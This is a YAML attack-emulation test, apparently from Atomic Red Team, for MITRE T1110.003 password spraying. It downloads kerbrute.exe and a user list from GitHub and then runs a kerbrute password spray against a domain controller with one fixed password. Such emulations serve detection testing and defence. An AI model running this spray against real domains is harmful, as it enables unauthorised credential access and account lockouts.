api_version: "2.0"
name: Password Spray using Kerbrute Tool
description: |
    Test a single password against a list of users
args:
    - name: domaincontroller
      type: string
      default: $ENV:userdnsdomain
    - name: domain
      type: string
      default: $ENV:userdomain
uuid: c6f25ec3-6475-47a9-b75d-09ac593c5ecb
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.003: Password Spraying'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
      inline: |
        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
        }}
      executor: powershell
    - name: |
        passwordspray.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
      inline: |
        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"
        }}
      executor: powershell
    - name: password-spray-using-kerbrute-tool
      inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc {{.Args.domaincontroller}} -d {{.Args.domain}} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
